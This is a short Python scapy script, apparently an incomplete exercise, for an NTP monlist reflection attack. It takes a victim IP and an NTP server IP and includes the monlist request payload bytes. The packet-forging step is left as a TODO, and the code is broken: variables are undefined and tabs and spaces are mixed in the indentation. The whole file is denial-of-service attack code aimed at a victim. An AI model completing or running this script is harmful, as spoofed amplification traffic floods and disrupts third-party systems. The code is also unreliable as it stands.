#!/usr/local/bin/python3.8

from scapy.all import *
import random


def usage():
	print(f"Usage: python3.8 {sys.argv[0]} <victim ip> <ntp server ip>")


def startAttack(victim_ip, ntp_server_ip):
    # NTP monlist packet payload
    data = "\x17\x00\x03\x2a" + "\x00" * 4 * 11

	print(f"Attacking {victim_ip} whith {ntp_server_ip} as NTP server")

    # TODO: forge packet
    #packet = 

    # send packet
    send(packet, loop=0)

	print(f"Attack finished. Sent {sent_packets} packets.")


def main():
	if len(sys.argv) != 3:
		usage()
		exit(1)

	startAttack(sys.argv[1], sys.argv[2])


if __name__ == '__main__':
	main()
